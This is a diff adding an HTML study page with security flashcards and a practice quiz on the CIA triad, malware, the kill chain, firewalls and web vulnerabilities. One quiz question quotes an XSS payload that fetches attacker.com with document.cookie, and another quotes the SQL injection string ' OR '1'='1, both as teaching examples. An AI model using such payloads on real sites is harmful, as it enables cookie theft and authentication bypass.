@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Study Hub: Flashcards & Quiz</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<style>
+    /* Flashcard 3D Flip Animations */
+    .perspective-1000 { perspective: 1000px; }
+    .transform-style-3d { transform-style: preserve-3d; }
+    .backface-hidden { backface-visibility: hidden; }
+    .rotate-y-180 { transform: rotateY(180deg); }
+    .transition-transform { transition: transform 0.6s cubic-bezier(0.4, 0.2, 0.2, 1); }
+    
+    /* Tab active styles */
+    .tab-active { border-bottom: 4px solid #0d9488; color: #0d9488; font-weight: bold; }
+    .tab-inactive { border-bottom: 4px solid transparent; color: #57534e; }
+</style>
+</head>
+<body class="bg-stone-100 min-h-screen font-sans text-stone-800">
+
+<header class="bg-stone-900 text-stone-50 py-6 px-4 shadow-md">
+    <div class="max-w-4xl mx-auto flex justify-between items-center">
+        <div>
+            <h1 class="text-2xl font-bold tracking-tight">Week 09: Security Domains</h1>
+            <p class="text-stone-400 text-sm mt-1">Interactive Study Hub</p>
+        </div>
+    </div>
+</header>
+
+<main class="max-w-4xl mx-auto mt-8 bg-white rounded-xl shadow-lg overflow-hidden border border-stone-200">
+    <nav class="flex border-b border-stone-200 bg-stone-50" id="tabs">
+        <button onclick="switchTab('flashcards')" id="btn-flashcards" class="tab-active w-1/2 py-4 text-center focus:outline-none hover:bg-stone-200 transition-colors">
+            🃏 Flashcards (25)
+        </button>
+        <button onclick="switchTab('quiz')" id="btn-quiz" class="tab-inactive w-1/2 py-4 text-center focus:outline-none hover:bg-stone-200 transition-colors">
+            📝 Practice Quiz (10)
+        </button>
+    </nav>
+
+    <section id="sec-flashcards" class="p-8 block">
+        <div class="text-center mb-6">
+            <h2 class="text-xl font-bold text-teal-800">Concept Mastery</h2>
+            <p class="text-stone-500 text-sm">Click the card to reveal the definition.</p>
+        </div>
+
+        <div class="flex flex-col items-center">
+            <div class="relative w-full max-w-lg h-64 perspective-1000 cursor-pointer group" onclick="flipCard()">
+                <div id="flashcard-inner" class="w-full h-full relative transform-style-3d transition-transform">
+                    <div class="absolute w-full h-full backface-hidden bg-white border-2 border-teal-600 rounded-xl shadow-md flex items-center justify-center p-6 text-center">
+                        <div>
+                            <span class="text-teal-600 font-bold tracking-widest uppercase text-xs mb-2 block">Term</span>
+                            <h3 id="card-front" class="text-2xl font-bold text-stone-800"></h3>
+                        </div>
+                    </div>
+                    <div class="absolute w-full h-full backface-hidden bg-teal-700 border-2 border-teal-800 rounded-xl shadow-md flex items-center justify-center p-6 text-center rotate-y-180">
+                        <div>
+                            <span class="text-teal-200 font-bold tracking-widest uppercase text-xs mb-2 block">Definition</span>
+                            <p id="card-back" class="text-lg font-medium text-white"></p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="flex items-center justify-between w-full max-w-lg mt-8">
+                <button onclick="prevCard()" class="px-4 py-2 bg-stone-200 hover:bg-stone-300 rounded font-bold text-stone-700 transition-colors">&larr; Previous</button>
+                <span id="card-counter" class="text-stone-500 font-medium">1 / 25</span>
+                <button onclick="nextCard()" class="px-4 py-2 bg-teal-600 hover:bg-teal-700 rounded font-bold text-white transition-colors">Next &rarr;</button>
+            </div>
+        </div>
+    </section>
+
+    <section id="sec-quiz" class="p-8 hidden">
+        <div class="text-center mb-8 border-b border-stone-200 pb-6">
+            <h2 class="text-xl font-bold text-teal-800">Knowledge Check</h2>
+            <p class="text-stone-500 text-sm">Test your practical understanding of the security domains.</p>
+        </div>
+        
+        <div id="quiz-container" class="space-y-12">
+            </div>
+    </section>
+</main>
+
+<script>
+// --- DATA: 25 FLASHCARDS ---
+const flashcards = [
+    { front: "Confidentiality", back: "Security principle ensuring that only authorised parties can access data." },
+    { front: "Integrity", back: "Security principle guaranteeing that data has not been altered without authorisation." },
+    { front: "Availability", back: "Security principle ensuring that data and systems are accessible whenever they are needed." },
+    { front: "Privilege Escalation", back: "An attack where someone with low-level access exploits a flaw to obtain root or administrator rights." },
+    { front: "Patch Management", back: "The practice of applying security updates immediately to mitigate vulnerabilities and reduce attack surfaces." },
+    { front: "Principle of Least Privilege", back: "Giving every user and process only the minimum permissions absolutely required to perform their function." },
+    { front: "Defence in Depth", back: "Layering multiple security controls so a single failure does not compromise the entire system." },
+    { front: "Computer Virus", back: "Malware that attaches to files and spreads upon execution." },
+    { front: "Computer Worm", back: "Malware that self-replicates across networks without requiring user action." },
+    { front: "Trojan Horse", back: "Malicious software that disguises itself as a legitimate program to deceive users." },
+    { front: "Ransomware", back: "Malware that encrypts a victim's files and demands payment for the decryption key." },
+    { front: "Rootkit", back: "Malware that hides deep within the operating system for persistent, invisible access." },
+    { front: "Reconnaissance (Cyber Kill Chain)", back: "The first stage of a cyberattack involving information gathering about the target." },
+    { front: "Weaponisation (Cyber Kill Chain)", back: "The stage of crafting a malicious payload specific to gathered intelligence." },
+    { front: "Command & Control / C2 (Kill Chain)", back: "The stage where installed malware communicates back to attacker infrastructure for instructions." },
+    { front: "Signature-Based Detection", back: "Identifying malware by matching it against a database of known threat fingerprints." },
+    { front: "Heuristic Detection", back: "Identifying unknown malware by flagging suspicious behaviour patterns." },
+    { front: "Sandboxing", back: "Executing suspect files in an isolated, secure environment to safely observe their behaviour." },
+    { front: "Default Deny Policy", back: "A firewall configuration where any packet not explicitly allowed by a rule is automatically dropped." },
+    { front: "IDS (Intrusion Detection System)", back: "A passive security tool that monitors network traffic and alerts on suspicious activity." },
+    { front: "IPS (Intrusion Prevention System)", back: "An active security tool that monitors network traffic and blocks malicious activity." },
+    { front: "Network Segmentation", back: "Dividing a network into isolated zones to prevent attackers from spreading laterally upon a breach." },
+    { front: "XSS (Cross-Site Scripting)", back: "A web vulnerability where attackers inject malicious scripts into pages viewed by other users." },
+    { front: "SQL Injection", back: "A web attack that modifies database queries through crafted input fields to read, modify, or delete data." },
+    { front: "CSRF (Cross-Site Request Forgery)", back: "An attack that tricks an authenticated user's browser into making an unwanted, unauthorized request." }
+];
+
+// --- DATA: 10 QUIZ QUESTIONS ---
+const quizData = [
+    {
+        q: "A hospital's patient records database is hit by a ransomware attack, making the records completely inaccessible to doctors and nurses. Which principle of the CIA Triad has been directly compromised in this scenario?",
+        hint: "Consider which part of the foundational security model focuses specifically on ensuring data can be reached when it is needed.",
+        options: [
+            { text: "Confidentiality", isCorrect: false, rationale: "This principle prevents unauthorized disclosure, whereas the scenario primarily involves data being locked away rather than necessarily stolen." },
+            { text: "Integrity", isCorrect: false, rationale: "This ensures data is not altered maliciously, and while encryption alters the file structure, the immediate functional impact is the loss of access." },
+            { text: "Availability", isCorrect: true, rationale: "Ransomware encryption directly prevents authorized users from accessing the critical systems and data they need to perform their duties." },
+            { text: "Non-repudiation", isCorrect: false, rationale: "This concept ensures that a party cannot deny the authenticity of their signature, which is unrelated to a system being locked by malware." }
+        ]
+    },
+    {
+        q: "An attacker gains access to a corporate server using the compromised credentials of a temporary marketing intern. They then exploit a software vulnerability in an outdated local application to run commands as the root user. What is this specific process called?",
+        hint: "Think of the hotel analogy where a guest figures out how to forge a General Manager's master key.",
+        options: [
+            { text: "Lateral Movement", isCorrect: false, rationale: "This describes an attacker moving from one compromised system to another, rather than climbing the permission ladder on a single machine." },
+            { text: "Session Hijacking", isCorrect: false, rationale: "This involves taking over an active session at the network or application layer, not exploiting an OS vulnerability to gain root access." },
+            { text: "Privilege Escalation", isCorrect: true, rationale: "The attacker started with low-level, restricted access and successfully exploited a flaw to elevate their rights to an unrestricted administrative level." },
+            { text: "Defense in Depth", isCorrect: false, rationale: "This is a security strategy that involves layering multiple defensive controls to protect systems, not an attack methodology." }
+        ]
+    },
+    {
+        q: "To improve security, a system admin configures the web server software to run under a dedicated 'web-svc' account. This account is explicitly denied access to the system's password files and lacks the ability to restart the server. Which OS hardening principle does this illustrate?",
+        hint: "This practice is about giving an entity exactly what it needs to do its job, and nothing more.",
+        options: [
+            { text: "Least Privilege", isCorrect: true, rationale: "By restricting the service account to only the permissions absolutely required to serve web pages, the potential damage if the web server is compromised is severely limited." },
+            { text: "Patch Management", isCorrect: false, rationale: "This involves applying software updates to fix known vulnerabilities, rather than configuring user or service permissions." },
+            { text: "Network Segmentation", isCorrect: false, rationale: "This isolates different network zones from one another using firewalls or VLANs, rather than restricting local OS permissions." },
+            { text: "Disable Unnecessary Services", isCorrect: false, rationale: "This involves turning off unused software components entirely to reduce the attack surface, not configuring permissions of active services." }
+        ]
+    },
+    {
+        q: "A company's internal network suddenly experiences massive congestion. IT discovers malicious software that is rapidly copying itself from workstation to workstation over the network, without any users clicking malicious links. What type of malware is this most likely to be?",
+        hint: "This type of malware is notable for its ability to self-propagate across networks without requiring human interaction to trigger execution.",
+        options: [
+            { text: "Trojan", isCorrect: false, rationale: "This type of malware disguises itself as legitimate software and typically requires a user to intentionally execute it." },
+            { text: "Worm", isCorrect: true, rationale: "This malware category is defined by its ability to self-replicate and spread autonomously across networks, often exploiting known service vulnerabilities." },
+            { text: "Virus", isCorrect: false, rationale: "This requires attaching itself to a host file or program and spreading when that specific infected file is executed or shared by a user." },
+            { text: "Spyware", isCorrect: false, rationale: "This software focuses on silently monitoring user activity and stealing data, rather than aggressively self-replicating and causing network congestion." }
+        ]
+    },
+    {
+        q: "An attacker attempts to send an email with a malicious PDF attachment to an HR employee. The company's secure email gateway scans the incoming attachment, detects a known malicious signature, and drops the email before it reaches the inbox. Which stage of the Cyber Kill Chain was disrupted?",
+        hint: "Consider the step in the attacker's methodology where the weaponized payload is actively being transmitted to the intended target.",
+        options: [
+            { text: "Reconnaissance", isCorrect: false, rationale: "This is the earlier stage where the attacker is gathering information about the target, such as finding the email address." },
+            { text: "Delivery", isCorrect: true, rationale: "The email gateway intercepted the malicious payload while it was in transit to the victim, successfully breaking the chain before the payload could arrive." },
+            { text: "Installation", isCorrect: false, rationale: "This stage occurs after a payload has arrived and successfully exploited a vulnerability, allowing the malware to establish persistence." },
+            { text: "Command & Control (C2)", isCorrect: false, rationale: "This involves established malware communicating outward to the attacker's infrastructure, which happens long after initial payload transmission." }
+        ]
+    },
+    {
+        q: "A system administrator configures a new network firewall. They add specific rules allowing HTTP, HTTPS, and SSH traffic from known IP ranges. At the very bottom of the rule list, they place a final rule that drops all other traffic. What is this security concept called?",
+        hint: "This principle ensures that anything that isn't explicitly permitted is automatically assumed to be forbidden.",
+        options: [
+            { text: "Anomaly Detection", isCorrect: false, rationale: "This involves identifying deviations from a normal baseline of behavior, typically used by Intrusion Detection Systems." },
+            { text: "Stateful Inspection", isCorrect: false, rationale: "This refers to the firewall's ability to track the state of active connections, rather than the logic used to evaluate the final catch-all rule." },
+            { text: "Packet Filtering", isCorrect: false, rationale: "This is the broad category of firewall operation that inspects headers, but it does not specify the strict whitelist-only policy described." },
+            { text: "Default Deny", isCorrect: true, rationale: "Because firewall rules are evaluated top-down, a catch-all rule at the bottom ensures that any packet not matching an explicit 'allow' rule is automatically rejected." }
+        ]
+    },
+    {
+        q: "An organization wants to monitor their network for suspicious traffic patterns matching known malware signatures, but they are highly concerned about accidentally blocking legitimate business traffic due to false positives. They want the system to only alert the security team. Which tool should they deploy?",
+        hint: "Look for the tool that acts as an alarm system, passively observing and notifying without actively dropping packets.",
+        options: [
+            { text: "Intrusion Prevention System (IPS)", isCorrect: false, rationale: "This tool sits inline and actively drops packets or blocks connections when it detects suspicious activity, contradicting the requirements." },
+            { text: "Web Application Firewall (WAF)", isCorrect: false, rationale: "This is a specific type of active firewall designed to protect web applications by inspecting HTTP payloads, and it typically blocks requests." },
+            { text: "Intrusion Detection System (IDS)", isCorrect: true, rationale: "This system passively monitors network traffic, creating alerts for the security team when malicious patterns are recognized without interfering with the traffic flow." },
+            { text: "Virtual Private Network (VPN)", isCorrect: false, rationale: "This technology is used to encrypt traffic between endpoints over an untrusted network, not for inspecting traffic for malware signatures." }
+        ]
+    },
+    {
+        q: "A malicious user submits a comment on a forum containing the text `<script>fetch('http://attacker.com/?cookie='+document.cookie)<\/script>`. When other users view that comment thread, their browsers execute the script, sending their session cookies to the attacker. Which vulnerability allowed this?",
+        hint: "This attack takes advantage of a web application's failure to sanitize user input before reflecting it back into the browser of a victim.",
+        options: [
+            { text: "Cross-Site Scripting (XSS)", isCorrect: true, rationale: "The application failed to sanitize the comment input, allowing the attacker to inject malicious JavaScript executed by other users' browsers." },
+            { text: "SQL Injection", isCorrect: false, rationale: "This vulnerability targets the backend database by manipulating input fields to alter queries, rather than executing malicious code in the victim's browser." },
+            { text: "Cross-Site Request Forgery (CSRF)", isCorrect: false, rationale: "This attack tricks a user's browser into submitting an unwanted action to a trusted site, rather than injecting executable scripts into the webpage." },
+            { text: "SSL Stripping", isCorrect: false, rationale: "This is a network-layer attack where an attacker downgrades a secure HTTPS connection to plain HTTP, rather than exploiting a web application input flaw." }
+        ]
+    },
+    {
+        q: "A developer is building a login page and wants to ensure that attackers cannot bypass authentication by typing things like `' OR '1'='1` into the username field. What is the most effective prevention method they should implement in their backend code?",
+        hint: "This prevention technique ensures that user input is always treated strictly as literal data, rather than executable code within the database query.",
+        options: [
+            { text: "Anti-CSRF tokens", isCorrect: false, rationale: "These unique tokens protect against unauthorized state-changing requests, but they do not stop an attacker from manipulating the logic of a database query." },
+            { text: "Parameterised queries", isCorrect: true, rationale: "Also known as prepared statements, this technique forces the database to distinguish between the code of the query and the user-supplied data, neutralizing injection attempts." },
+            { text: "Content Security Policy (CSP)", isCorrect: false, rationale: "This is an HTTP header that helps mitigate Cross-Site Scripting (XSS), but it does not interact with backend database queries." },
+            { text: "SameSite cookie attributes", isCorrect: false, rationale: "This attribute prevents the browser from sending session cookies along with cross-site requests to mitigate CSRF, but provides no defense against database manipulation." }
+        ]
+    },
+    {
+        q: "While logged into their banking portal, a user clicks a deceptive link on a different browser tab. The link secretly submits a background request to the bank to transfer funds to the attacker's account, which succeeds because the bank trusts the user's active session cookie. What attack has occurred?",
+        hint: "The attacker leveraged the victim's existing, authenticated session to force their browser to perform a malicious action without their consent.",
+        options: [
+            { text: "Cross-Site Request Forgery (CSRF)", isCorrect: true, rationale: "The attacker successfully tricked the authenticated user's browser into forging a legitimate-looking request, taking advantage of the automatically attached session cookies." },
+            { text: "SQL Injection", isCorrect: false, rationale: "There is no indication that the attacker manipulated a database query; instead, they manipulated the user's browser into making an authorized web request." },
+            { text: "Privilege Escalation", isCorrect: false, rationale: "The attacker did not elevate their own permissions on an OS or network; they abused the permissions already granted to the victim's active banking session." },
+            { text: "Cross-Site Scripting (XSS)", isCorrect: false, rationale: "While this involves a web browser, it relies on submitting a forged request from a different origin, rather than injecting and executing malicious JavaScript on the bank's actual page." }
+        ]
+    }
+];
+
+// --- APP LOGIC ---
+
+// Tab Switching Logic
+function switchTab(tabId) {
+    // Hide all sections
+    document.getElementById('sec-flashcards').classList.add('hidden');
+    document.getElementById('sec-flashcards').classList.remove('block');
+    document.getElementById('sec-quiz').classList.add('hidden');
+    document.getElementById('sec-quiz').classList.remove('block');
+    
+    // Reset Tab Styles
+    document.getElementById('btn-flashcards').className = "tab-inactive w-1/2 py-4 text-center focus:outline-none hover:bg-stone-200 transition-colors";
+    document.getElementById('btn-quiz').className = "tab-inactive w-1/2 py-4 text-center focus:outline-none hover:bg-stone-200 transition-colors";
+
+    // Activate selected
+    document.getElementById('sec-' + tabId).classList.remove('hidden');
+    document.getElementById('sec-' + tabId).classList.add('block');
+    document.getElementById('btn-' + tabId).className = "tab-active w-1/2 py-4 text-center focus:outline-none hover:bg-stone-200 transition-colors";
+}
+
+// Flashcard Logic
+let currentCardIndex = 0;
+let isFlipped = false;
+
+function updateCard() {
+    const frontEl = document.getElementById('card-front');
+    const backEl = document.getElementById('card-back');
+    const counterEl = document.getElementById('card-counter');
+    const innerEl = document.getElementById('flashcard-inner');
+
+    // Remove flip class if active
+    if (isFlipped) {
+        innerEl.classList.remove('rotate-y-180');
+        isFlipped = false;
+        // Wait for flip back before updating text to avoid visual glitch
+        setTimeout(() => {
+            frontEl.textContent = flashcards[currentCardIndex].front;
+            backEl.textContent = flashcards[currentCardIndex].back;
+        }, 300);
+    } else {
+        frontEl.textContent = flashcards[currentCardIndex].front;
+        backEl.textContent = flashcards[currentCardIndex].back;
+    }
+    
+    counterEl.textContent = `${currentCardIndex + 1} / ${flashcards.length}`;
+}
+
+function flipCard() {
+    const innerEl = document.getElementById('flashcard-inner');
+    if (isFlipped) {
+        innerEl.classList.remove('rotate-y-180');
+    } else {
+        innerEl.classList.add('rotate-y-180');
+    }
+    isFlipped = !isFlipped;
+}
+
+function nextCard() {
+    currentCardIndex = (currentCardIndex + 1) % flashcards.length;
+    updateCard();
+}
+
+function prevCard() {
+    currentCardIndex = (currentCardIndex - 1 + flashcards.length) % flashcards.length;
+    updateCard();
+}
+
+// Quiz Logic
+function renderQuiz() {
+    const container = document.getElementById('quiz-container');
+    container.innerHTML = '';
+
+    quizData.forEach((item, qIndex) => {
+        // Shuffle options for this question
+        const shuffledOptions = [...item.options].sort(() => Math.random() - 0.5);
+
+        const qDiv = document.createElement('div');
+        qDiv.className = "bg-stone-50 border border-stone-200 p-6 rounded-xl shadow-sm";
+        
+        let html = `
+            <div class="mb-4 flex items-start">
+                <span class="bg-teal-700 text-white font-bold w-8 h-8 flex items-center justify-center rounded-full flex-shrink-0 mr-4 mt-1">${qIndex + 1}</span>
+                <h3 class="text-lg font-semibold text-stone-800">${item.q}</h3>
+            </div>
+            <button onclick="toggleHint(${qIndex})" class="text-sm text-teal-600 font-medium hover:underline mb-4 focus:outline-none">💡 Show Hint</button>
+            <p id="hint-${qIndex}" class="hidden text-sm text-stone-600 bg-stone-200 p-3 rounded mb-4 border-l-4 border-teal-500">${item.hint}</p>
+            <div class="space-y-3">
+        `;
+
+        shuffledOptions.forEach((opt, oIndex) => {
+            const optId = `q${qIndex}-o${oIndex}`;
+            html += `
+                <button id="btn-${optId}" onclick="handleAnswer(${qIndex}, ${oIndex}, ${opt.isCorrect})" class="w-full text-left p-4 border border-stone-300 rounded-lg hover:bg-stone-100 transition-colors focus:outline-none flex justify-between items-center group">
+                    <span class="font-medium text-stone-700">${opt.text}</span>
+                    <span id="icon-${optId}" class="hidden text-xl"></span>
+                </button>
+                <div id="rationale-${optId}" class="hidden text-sm p-4 mt-1 rounded-lg border">
+                    ${opt.rationale}
+                </div>
+            `;
+        });
+
+        html += `</div>`;
+        qDiv.innerHTML = html;
+        
+        // Store options data attached to the DOM element for easy retrieval
+        qDiv.dataset.options = JSON.stringify(shuffledOptions);
+        container.appendChild(qDiv);
+    });
+}
+
+function toggleHint(qIndex) {
+    const hintEl = document.getElementById(`hint-${qIndex}`);
+    if (hintEl.classList.contains('hidden')) {
+        hintEl.classList.remove('hidden');
+    } else {
+        hintEl.classList.add('hidden');
+    }
+}
+
+function handleAnswer(qIndex, oIndex, isCorrect) {
+    const optId = `q${qIndex}-o${oIndex}`;
+    const btn = document.getElementById(`btn-${optId}`);
+    const icon = document.getElementById(`icon-${optId}`);
+    const rationale = document.getElementById(`rationale-${optId}`);
+
+    // Reveal Logic
+    rationale.classList.remove('hidden');
+    icon.classList.remove('hidden');
+
+    if (isCorrect) {
+        btn.classList.remove('border-stone-300', 'hover:bg-stone-100');
+        btn.classList.add('border-teal-500', 'bg-teal-50');
+        icon.textContent = "✅";
+        rationale.classList.add('bg-teal-50', 'text-teal-900', 'border-teal-200');
+    } else {
+        btn.classList.remove('border-stone-300', 'hover:bg-stone-100');
+        btn.classList.add('border-rose-400', 'bg-rose-50');
+        icon.textContent = "❌";
+        rationale.classList.add('bg-rose-50', 'text-rose-900', 'border-rose-200');
+    }
+}
+
+// Initialize Application
+window.onload = () => {
+    updateCard();
+    renderQuiz();
+};
+</script>
+</body>
+</html>
+
+
+
